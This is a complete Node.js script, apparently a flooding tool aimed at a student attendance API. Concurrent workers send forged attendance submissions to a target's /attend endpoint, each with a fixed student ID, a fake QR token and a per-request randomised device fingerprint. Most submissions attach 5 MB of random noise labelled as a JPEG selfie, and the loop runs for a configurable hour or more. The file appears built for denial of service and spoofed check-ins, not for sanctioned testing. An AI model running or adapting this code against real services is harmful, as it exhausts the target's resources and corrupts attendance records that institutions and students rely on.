// job_a — steady request generator
import { readFileSync, appendFileSync } from "fs";

const HOST = process.env.TARGET;
const SID = process.env.SID;
if (!HOST || !SID) process.exit(0);

const DURATION = parseInt(process.env.DURATION || "3600") * 1000;
const CONC = parseInt(process.env.CONC || "3");
const LOG = "job_a.log";
const say = (s) => { console.log(s); log(s); };

const payloads = [];
try { payloads.push({ buf: readFileSync(new URL("./img_a.jpg", import.meta.url)), tag: "A" }); } catch {}
try { payloads.push({ buf: readFileSync(new URL("./img_b.jpg", import.meta.url)), tag: "B" }); } catch {}

const mkNoise = () => {
  const b = Buffer.alloc(5 * 1048576);
  for (let i = 0; i < b.length; i++) b[i] = (Math.random() * 256) | 0;
  b.write("BM", 0);
  return { buf: b, tag: "N" };
};

const log = (s) => { try { appendFileSync(LOG, `[${new Date().toISOString()}] ${s}\n`); } catch {} };

let running = true;
let sent = 0, errors = 0, codes = {};
const worker = async (id) => {
  while (running) {
    const p = sent % 3 === 2 ? payloads[sent % payloads.length] : mkNoise();
    sent++;
    const fd = new FormData();
    fd.append("student_id", "23345678");
    fd.append("student_name", "T");
    fd.append("qr_token", "abc");
    fd.append("device_fingerprint", `w_${id}_${Date.now()}`);
    fd.append("faces", "1");
    fd.append("selfie", new Blob([p.buf], { type: "image/jpeg" }), "selfie.jpg");
    try {
      const r = await fetch(`${HOST}/api/sessions/${SID}/attend`, { method: "POST", body: fd, signal: AbortSignal.timeout(240000) });
      codes[r.status] = (codes[r.status] || 0) + 1;
    } catch { errors++; codes["ERR"] = (codes["ERR"] || 0) + 1; }
    await new Promise(z => setTimeout(z, 200));
  }
};

(async () => {
  say(`start conc=${CONC} dur=${DURATION / 1000}s`);
  const workers = [];
  for (let i = 0; i < CONC; i++) workers.push(worker(i));
  const t0 = Date.now();
  while (Date.now() - t0 < DURATION) {
    await new Promise(z => setTimeout(z, 30000));
    say(`t+${((Date.now() - t0) / 1000).toFixed(0)}s sent=${sent} codes=${JSON.stringify(codes)} err=${errors}`);
    codes = {}; errors = 0;
  }
  running = false;
  process.exit(0);
})();
